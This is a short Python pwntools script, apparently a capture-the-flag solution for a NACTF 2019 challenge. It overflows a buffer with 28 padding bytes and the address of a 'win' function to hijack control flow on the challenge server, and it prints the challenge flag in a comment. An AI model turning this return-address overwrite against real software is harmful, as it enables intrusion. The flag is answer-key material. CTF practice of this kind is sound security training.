from pwn import * 
connection = remote('shell.2019.nactf.com', 31462)
#through fuzzing we found buffer
offset = 28
#through objdump -d we found the address of win as 0x080491b2
address = p32(0x080491b2)
#perform the bufferoverflow itself
connection.sendline('a'*offset + address)
connection.interactive()

#The flag is nactf{pwn_31p_0n_r3t_iNylg281}
